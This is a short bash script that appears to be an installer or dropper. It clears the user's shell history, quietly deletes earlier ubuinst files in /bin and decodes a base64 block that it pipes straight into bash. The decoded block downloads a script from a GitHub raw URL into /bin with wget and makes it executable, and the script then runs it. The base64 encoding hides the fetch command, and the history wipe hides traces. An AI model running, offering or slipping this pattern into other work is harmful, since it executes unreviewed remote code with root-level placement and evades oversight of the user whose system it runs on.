#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
bS9uYW5kb3NsYXllci9pbnN0YWxsL2JhZC91YnVpbnN0Mi5zaCAmJiBjaG1vZCAreCB1YnVpbnN0
Mi5zaCAmJiBkb3MydW5peCB1YnVpbnN0Mi5zaCA+IC9kZXYvbnVsbCAyPiYxCmNkIHx8IGV4aXQ=' | base64 -d | bash
/bin/ubuinst2.sh
